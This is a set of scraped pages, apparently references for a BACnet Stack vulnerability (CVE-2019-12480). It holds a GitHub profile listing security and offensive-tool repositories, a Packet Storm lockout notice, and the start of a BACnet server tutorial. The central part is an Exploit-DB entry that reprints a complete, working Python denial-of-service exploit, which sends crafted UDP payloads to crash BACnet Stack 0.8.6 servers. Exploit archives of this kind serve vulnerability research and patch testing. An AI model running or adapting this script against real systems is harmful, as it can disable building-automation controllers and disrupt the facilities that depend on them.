  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2F1modm%3Ftab%3Drepositories)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F1modm&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

![@1modm](https://avatars.githubusercontent.com/u/4355335?s=64&v=4)

**1modm**
[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2F1modm%3Ftab%3Drepositories)

[Overview](/1modm)
[Repositories
35](/1modm?tab=repositories)
[Projects
0](/1modm?tab=projects)
[Packages
0](/1modm?tab=packages)
[Stars
173](/1modm?tab=stars)

More

* [Overview](/1modm)
* [Repositories](/1modm?tab=repositories)
* [Projects](/1modm?tab=projects)
* [Packages](/1modm?tab=packages)
* [Stars](/1modm?tab=stars)

![@1modm](https://avatars.githubusercontent.com/u/4355335?s=64&v=4)

**1modm**

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2F1modm%3Ftab%3Drepositories)

[![View 1modm's full-sized avatar](https://avatars.githubusercontent.com/u/4355335?v=4)](https://avatars.githubusercontent.com/u/4355335?v=4)

# M 1modm

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2F1modm%3Ftab%3Drepositories)

[70
followers](https://github.com/1modm?tab=followers) · [23
following](https://github.com/1modm?tab=following)

* https://keybase.io/1modm
* <https://1modm.github.io/>

## [Achievements](/1modm?tab=achievements)

[![Achievement: Starstruck](https://github.githubassets.com/assets/starstruck-default-b6610abad518.png)x2](/1modm?achievement=starstruck&tab=achievements)[![Achievement: Arctic Code Vault Contributor](https://github.githubassets.com/assets/arctic-code-vault-contributor-default-df8d74122a06.png)](/1modm?achievement=arctic-code-vault-contributor&tab=achievements)[![Achievement: Pull Shark](https://github.githubassets.com/assets/pull-shark-default-498c279a747d.png)](/1modm?achievement=pull-shark&tab=achievements)
## [Achievements](/1modm?tab=achievements)

[![Achievement: Starstruck](https://github.githubassets.com/assets/starstruck-default-b6610abad518.png)x2](/1modm?achievement=starstruck&tab=achievements)[![Achievement: Arctic Code Vault Contributor](https://github.githubassets.com/assets/arctic-code-vault-contributor-default-df8d74122a06.png)](/1modm?achievement=arctic-code-vault-contributor&tab=achievements)[![Achievement: Pull Shark](https://github.githubassets.com/assets/pull-shark-default-498c279a747d.png)](/1modm?achievement=pull-shark&tab=achievements)

Block or Report

# Block or report 1modm

**Block user**

Prevent this user from interacting with your repositories and sending you notifications.
Learn more about [blocking users](https://docs.github.com/articles/blocking-a-user-from-your-personal-account).

You must be logged in to block users.

Add an optional note:

Please don't include any personal information such as legal names or email addresses. Maximum 100 characters, markdown supported. This note will be visible to only you.

Block user

**Report abuse**

Contact GitHub support about this user’s behavior.
Learn more about [reporting abuse](https://docs.github.com/articles/reporting-abuse-or-spam).

[Report abuse](/contact/report-abuse?report=1modm+%28user%29)

[Overview](/1modm)
[Repositories
35](/1modm?tab=repositories)
[Projects
0](/1modm?tab=projects)
[Packages
0](/1modm?tab=packages)
[Stars
173](/1modm?tab=stars)

More

* [Overview](/1modm)
* [Repositories](/1modm?tab=repositories)
* [Projects](/1modm?tab=projects)
* [Packages](/1modm?tab=packages)
* [Stars](/1modm?tab=stars)

 Type
All

Select type

All

Sources

Forks

Archived

Can be sponsored

Mirrors

Templates

 Language
All

Select language

All

Python

JavaScript

HTML

C

Shell

PHP

Rust

CSS

Perl

 Sort
Last updated

Select order

Last updated

Name

Stars

* ### [fuzzowski](/1modm/fuzzowski) Public

  Forked from [nccgroup/fuzzowski](/nccgroup/fuzzowski)

  the Network Protocol Fuzzer that we will want to use.

  Python

  [3](/1modm/fuzzowski/stargazers)
  [1](/1modm/fuzzowski/forks)

  GNU General Public License v2.0

  Updated Nov 25, 2024
* ### [petereport](/1modm/petereport) Public

  PeTeReport is an open-source application vulnerability reporting tool.

  JavaScript

  [478](/1modm/petereport/stargazers)
  [134](/1modm/petereport/forks)

  BSD 3-Clause "New" or "Revised" License

  [1 issue
  needs help](/1modm/petereport/issues?q=label%3A%22good+first+issue%22+is%3Aissue+is%3Aopen)
  Updated Jun 10, 2024
* ### [1modm.github.io](/1modm/1modm.github.io) Public

  HTML

  [2](/1modm/1modm.github.io/stargazers)
  [1](/1modm/1modm.github.io/forks)
  Updated Jan 11, 2024
* ### [1modm](/1modm/1modm) Public

  [1](/1modm/1modm/forks)
  Updated Nov 27, 2022
* ### [guardara](/1modm/guardara) Public

  Python

  [1](/1modm/guardara/forks)
  Updated Apr 13, 2022
* ### [nokogiri](/1modm/nokogiri) Public

  Forked from [sparklemotion/nokogiri](/sparklemotion/nokogiri)

  Nokogiri (鋸) makes it easy and painless to work with XML and HTML from Ruby.

  C

  [1](/1modm/nokogiri/forks)

  MIT License

  Updated Apr 11, 2022
* ### [API-SecurityEmpire](/1modm/API-SecurityEmpire) Public

  Forked from [Cyber-Guy1/API-SecurityEmpire](/Cyber-Guy1/API-SecurityEmpire)

  API Security Project aims to present unique attack & defense methods in API Security field

  [1](/1modm/API-SecurityEmpire/forks)
  Updated Mar 14, 2022
* ### [AutoSUID](/1modm/AutoSUID) Public

  Forked from [IvanGlinkin/AutoSUID](/IvanGlinkin/AutoSUID)

  AutoSUID application is the Open-Source project, the main idea of which is to automate harvesting the SUID executable files and to find a way for further escalating the privileges.

  Shell

  [1](/1modm/AutoSUID/forks)
  Updated Dec 1, 2021
* ### [thc-tips-tricks-hacks-cheat-sheet](/1modm/thc-tips-tricks-hacks-cheat-sheet) Public

  Forked from [hackerschoice/thc-tips-tricks-hacks-cheat-sheet](/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)

  Various tips & tricks

  C

  [2](/1modm/thc-tips-tricks-hacks-cheat-sheet/forks)
  Updated Nov 15, 2021
* ### [haptyc](/1modm/haptyc) Public

  Forked from [defparam/haptyc](/defparam/haptyc)

  Python

  [1](/1modm/haptyc/forks)

  Apache License 2.0

  Updated Sep 18, 2021
* ### [cyberchef-recipes](/1modm/cyberchef-recipes) Public

  Forked from [mattnotmax/cyberchef-recipes](/mattnotmax/cyberchef-recipes)

  A list of cyber-chef recipes and curated links

  [2](/1modm/cyberchef-recipes/stargazers)
  [1](/1modm/cyberchef-recipes/forks)
  Updated Jun 6, 2021
* ### [bugbounty-cheatsheet](/1modm/bugbounty-cheatsheet) Public

  Forked from [EdOverflow/bugbounty-cheatsheet](/EdOverflow/bugbounty-cheatsheet)

  A list of interesting payloads, tips and tricks for bug bounty hunters.

  [1](/1modm/bugbounty-cheatsheet/stargazers)
  [1](/1modm/bugbounty-cheatsheet/forks)

  Creative Commons Attribution Share Alike 4.0 International

  Updated May 19, 2021
* ### [Penetration-Testing-Cheat-Sheet](/1modm/Penetration-Testing-Cheat-Sheet) Public

  Forked from [curtishoughton/Penetration-Testing-Cheat-Sheet](/curtishoughton/Penetration-Testing-Cheat-Sheet)

  A guide to help people who are new to penetration testing and are looking to gain an overview of the penetration testing process. This guide will help anyone hoping to take the CREST CRT or Offensi…

  [3](/1modm/Penetration-Testing-Cheat-Sheet/stargazers)
  [2](/1modm/Penetration-Testing-Cheat-Sheet/forks)

  GNU General Public License v3.0

  Updated Feb 21, 2021
* ### [p0wny-shell](/1modm/p0wny-shell) Public

  Forked from [flozz/p0wny-shell](/flozz/p0wny-shell)

  Single-file PHP shell

  PHP

  [1](/1modm/p0wny-shell/stargazers)
  [2](/1modm/p0wny-shell/forks)

  Do What The F\*ck You Want To Public License

  Updated Jan 25, 2021
* ### [writehat](/1modm/writehat) Public

  Forked from [blacklanternsecurity/writehat](/blacklanternsecurity/writehat)

  A pentest reporting tool written in Python. Free yourself from Microsoft Word.

  Python

  GNU General Public License v3.0

  Updated Nov 30, 2020
* ### [feroxbuster](/1modm/feroxbuster) Public

  Forked from [epi052/feroxbuster](/epi052/feroxbuster)

  A fast, simple, recursive content discovery tool written in Rust.

  Rust

  [1](/1modm/feroxbuster/stargazers)
  [1](/1modm/feroxbuster/forks)

  MIT License

  Updated Oct 4, 2020
* ### [jekyll-theme-chirpy](/1modm/jekyll-theme-chirpy) Public

  Forked from [cotes2020/jekyll-theme-chirpy](/cotes2020/jekyll-theme-chirpy)

  A minimal, sidebar, responsive web design Jekyll theme, focusing on text presentation.

  CSS

  [1](/1modm/jekyll-theme-chirpy/forks)

  MIT License

  Updated Aug 11, 2020
* ### [meinheld](/1modm/meinheld) Public

  Forked from [mopemope/meinheld](/mopemope/meinheld)

  Meinheld is a high performance asynchronous WSGI Web Server (based on picoev)

  C

  [1](/1modm/meinheld/forks)

  Other

  Updated Jun 23, 2020
* ### [pwndrop](/1modm/pwndrop) Public

  Forked from [kgretzky/pwndrop](/kgretzky/pwndrop)

  Self-deployable file hosting service for red teamers, allowing to easily upload and share payloads over HTTP and WebDAV.

  JavaScript

  [1](/1modm/pwndrop/stargazers)
  [1](/1modm/pwndrop/forks)

  GNU General Public License v3.0

  Updated Apr 18, 2020
* ### [wapifuzz](/1modm/wapifuzz) Public

  Forked from [ysoftdevs/wapifuzz](/ysoftdevs/wapifuzz)

  Fully autonomous web APIs fuzzer

  Python

  [1](/1modm/wapifuzz/stargazers)
  [1](/1modm/wapifuzz/forks)

  Apache License 2.0

  Updated Dec 10, 2019
* ### [fuzref](/1modm/fuzref) Public

  Forked from [roddux/fuzref](/roddux/fuzref)

  Reference material for fuzzing and creating fuzzers

  [1](/1modm/fuzref/stargazers)
  [1](/1modm/fuzref/forks)
  Updated Apr 6, 2019
* ### [BACnet-fuzzer](/1modm/BACnet-fuzzer) Public

  Forked from [VDA-Labs/BACnet-fuzzer](/VDA-Labs/BACnet-fuzzer)

  Simple fuzzer using the Boofuzz framework to target the BACnet protocol.

  Python

  [1](/1modm/BACnet-fuzzer/stargazers)
  [1](/1modm/BACnet-fuzzer/forks)
  Updated Mar 22, 2019
* ### [CCToolkit](/1modm/CCToolkit) Public

  CCToolkit helps you to parse, export and generate a quick workunit checklist using the Common Criteria XML provided in https://www.commoncriteriaportal.org/cc/.

  HTML

  [4](/1modm/CCToolkit/stargazers)
  [1](/1modm/CCToolkit/forks)

  Other

  Updated Mar 12, 2019
* ### [Snippets](/1modm/Snippets) Public

  Python

  [2](/1modm/Snippets/stargazers)
  [2](/1modm/Snippets/forks)
  Updated Apr 9, 2018
* ### [Dshell](/1modm/Dshell) Public

  Forked from [USArmyResearchLab/Dshell](/USArmyResearchLab/Dshell)

  Dshell is a network forensic analysis framework.

  Python

  [1](/1modm/Dshell/stargazers)
  [1](/1modm/Dshell/forks)

  Other

  Updated Jul 20, 2017
* ### [Dshell\_decoders](/1modm/Dshell_decoders) Public

  Penetration/Exploit/Hijacking Tools, SIP and RTP decoders for Dshell

  Python

  [4](/1modm/Dshell_decoders/stargazers)
  [2](/1modm/Dshell_decoders/forks)
  Updated Jul 20, 2017
* ### [Third-Flare-On-challenge-solutions](/1modm/Third-Flare-On-challenge-solutions) Public

  Third Flare-On challenge solutions

  [2](/1modm/Third-Flare-On-challenge-solutions/stargazers)
  [1](/1modm/Third-Flare-On-challenge-solutions/forks)
  Updated Nov 6, 2016
* ### [AlienVault-Plugins](/1modm/AlienVault-Plugins) Public

  Forked from [packetinspector/AlienVault-Plugins](/packetinspector/AlienVault-Plugins)

  Plug-ins for AlienVault of course.

  Perl

  [1](/1modm/AlienVault-Plugins/stargazers)
  [1](/1modm/AlienVault-Plugins/forks)
  Updated Oct 17, 2016
* ### [Alienvault-Demo](/1modm/Alienvault-Demo) Public

  Forked from [packetinspector/Alienvault-Demo](/packetinspector/Alienvault-Demo)

  Scripts to inject demo data and network traffic into an existing Alienvault/OSSIM installation

  Perl

  [2](/1modm/Alienvault-Demo/stargazers)
  [1](/1modm/Alienvault-Demo/forks)
  Updated Oct 17, 2016
* ### [TimelineJS](/1modm/TimelineJS) Public

  Forked from [NUKnightLab/TimelineJS](/NUKnightLab/TimelineJS)

  TimelineJS: A Storytelling Timeline built in JavaScript.

  JavaScript

  [1](/1modm/TimelineJS/stargazers)
  [1](/1modm/TimelineJS/forks)

  Other

  Updated Oct 17, 2016

Previous [Next](/1modm?page=2&tab=repositories)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from packetstormsecurity.com_7fc084d3_20250121_002909.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT⛔ 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.

=== Content from www.exploit-db.com_b3d94c1a_20250121_023631.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# BACnet Stack 0.8.6 - Denial of Service

#### EDB-ID:

###### 47148

#### CVE:

###### [2019-12480](https://nvd.nist.gov/vuln/detail/CVE-2019-12480)

---

**EDB Verified:**

#### Author:

###### [mmorillo](/?author=10068)

#### Type:

###### [dos](/?type=dos)

---

#### Platform:

###### [Linux](/?platform=linux)

#### Date:

###### 2019-07-22

---

**Vulnerable App:**

```
# Exploit Title: BACnet Stack 0.8.6 - Denial of Service
# Google Dork: [if applicable]
# Date: 2019-07-19
# Exploit Author: mmorillo
# Vendor Homepage: https://sourceforge.net/p/bacnet/
# Software Link: https://sourceforge.net/projects/bacnet/files/bacnet-stack/bacnet-stack-0.8.6/
# Version: bacnet-stack-0.8.6
# Tested on: Linux
# CVE: CVE-2019-12480

#!/usr/bin/env python
#
# After reported the bug to the vendor, sharing details
# about the vulnerability, as well as proof-of-concept code (exploit code to
# test), has been release a fix for 0.8.7 release of
# BACnet Protocol Stack https://sourceforge.net/p/bacnet/

import socket
import struct
import argparse
import os
import sys
from termcolor import colored

#------------------------------------------------------------------------------
# Command line parser using argparse
#------------------------------------------------------------------------------

def cmdline_parser():
    parser = argparse.ArgumentParser(conflict_handler='resolve', add_help=True,
             description='BACnet Protocol Stack Segmentation fault leading to denial of service', version='0.1',
             usage="python %(prog)s")

    # Mandatory
    parser.add_argument('Server', type=str, help='BACnet server IP')
    parser.add_argument('Port', type=str, help='BACnet port')

    return parser

def get_Host_name_IP():
    try:
        host_name = socket.gethostname()
        host_ip = socket.gethostbyname(host_name)
        return host_ip
    except:
        print("Unable to get Hostname and IP")

def target_alive(BACnetServer, BACnetPort):
    response = os.system("nc -u -z -w 1 " + BACnetServer + " " + str(BACnetPort))

    if response == 0:
        return True
    else:
        return False

#------------------------------------------------------------------------------
# Main of program
#------------------------------------------------------------------------------

def main():

    # Get the command line parser.
    parser = cmdline_parser()

    # Show help if no args
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    # Get results line parser.
    results = parser.parse_args()

    BACnetServer = results.Server
    BACnetPort = int(results.Port)
    SRC_IP = get_Host_name_IP()

    if not target_alive(BACnetServer, BACnetPort):
        print((colored("[+] BACnet server down", "yellow")))

    else:
        if target_alive(BACnetServer, BACnetPort):

            payload_DeviceCommunicationControl = "\x81\x0a\x00\x16\x01\x04\x00\x05\x01\x11\x0d\xff\x80\x00\x03\x1a\x0a\x19\x00\x2a\x00\x41"

            print((colored("[+] Sending BACnet DeviceCommunicationControl payload from " + SRC_IP, "green")))

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
            s.connect((BACnetServer, BACnetPort))
            s.send(struct.pack('>I',len(payload_DeviceCommunicationControl)))
            s.send(payload_DeviceCommunicationControl)

            print((colored("[+] Sent Payload: " + payload_DeviceCommunicationControl.encode('hex') + ' to BACnet server ' + BACnetServer + ' port ' + str(BACnetPort), "yellow")))

        if target_alive(BACnetServer, BACnetPort):

            payload_AtomicReadFile = "\x81\x0a\x00\x1b\x01\x14\x00\x05\x01\x06\xc4\x02\x80\x00\x00\x0e\x35\xff\xdf\x62\xee\x00\x00\x22\x05\x84\x0f"

            print((colored("[+] Sending BACnet AtomicReadFile payload from " + SRC_IP, "green")))

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
            s.connect((BACnetServer, BACnetPort))
            s.send(struct.pack('>I',len(payload_AtomicReadFile)))
            s.send(payload_AtomicReadFile)

            print((colored("[+] Sent Payload: " + payload_AtomicReadFile.encode('hex') + ' to BACnet server ' + BACnetServer + ' port ' + str(BACnetPort), "yellow")))

        if target_alive(BACnetServer, BACnetPort):

            payload_AtomicWriteFile = "\x81\x0a\x00\x1b\x01\x04\x00\x05\x02\x07\xc4\x02\x80\x00\x00\x0e\x35\xff\x5e\xd5\xc0\x85\x0a\x62\x64\x0a\x0f"

            print((colored("[+] Sending BACnet AtomicWriteFile payload from " + SRC_IP, "green")))

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
            s.connect((BACnetServer, BACnetPort))
            s.send(struct.pack('>I',len(payload_AtomicWriteFile)))
            s.send(payload_AtomicWriteFile)

            print((colored("[+] Sent Payload: " + payload_AtomicWriteFile.encode('hex') + ' to BACnet server ' + BACnetServer + ' port ' + str(BACnetPort), "yellow")))

        if not target_alive(BACnetServer, BACnetPort):
            print((colored("[+] DoS completed", "red")))

#------------------------------------------------------------------------------
# Main
#------------------------------------------------------------------------------

if __name__ == '__main__':
    main()

```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from www.bac-test.com_e3ecf324_20250121_023636.html ===

[Skip to content](#main)
![BACnet Interoperability Testing Services, Inc](https://www.bac-test.com/wp-content/uploads/2019/05/cropped-Copy-of-Twitter-Header-–-Untitled-Design.png)
[![BACnet Interoperability Testing Services, Inc](https://www.bac-test.com/wp-content/uploads/2023/02/BITS_logo_fullname_2023.png)](https://www.bac-test.com/)

### [BACnet Interoperability Testing Services, Inc](https://www.bac-test.com/ "BACnet Interoperability Testing Services, Inc")

Diagnostic Tools for BACnet Devices & Networks

Menu

* [Home](https://www.bac-test.com/)
* [Products](https://www.bac-test.com/products/)
  + [BACnet Test Suite (BTS)](https://www.bac-test.com/bacnet-test-suite-bts/)
    - [Download and Purchase BACnet Test Suite Subscription](https://www.bac-test.com/bts-pricing/)
  + [BACnet Site Auditor](https://www.bac-test.com/bacnet-site-auditor-download/)
    - [Download and Purchase BACnet Site Auditor](https://www.bac-test.com/bacnet-site-auditor-download/)
  + [BACnet Site Monitor](https://www.bac-test.com/bacnet-site-monitor-download/)
    - [Download and Purchase BACnet Site Monitor](https://www.bac-test.com/bacnet-site-monitor-download/)
  + [BACnet Router Test Suite (BRTS)](https://www.bac-test.com/bacnet-test-suite-bts-router-tests/)
  + [BACnet MS/TP Test Unit](https://www.bac-test.com/bacnet-mstp-test-unit/)
  + [Perpetual PlugFest® BACnet Testing Service (Virtual)](https://www.bac-test.com/perpetual-plugfest/)
  + [Custom BACnet Training](https://www.bac-test.com/training/)
* [Blog](https://www.bac-test.com/blog/)
* [Contact](https://www.bac-test.com/contact/)
  + [Customer Portal](https://www.bac-test.com/sample-page/customer-portal/)
* [Resources](https://www.bac-test.com/resources/)
  + [BACnet Site Auditor – Site Setup Requirements](https://www.bac-test.com/resources/bacnet-site-auditor-site-setup-requirements/)

# How to build a FOSS BACnet Server based on Steve Karg’s SourceForge project

This article is based on FOSS (Free or Open Source Software) [BACnet Stack](https://sourceforge.net/projects/bacnet/?source=directory) found at SourceForge.

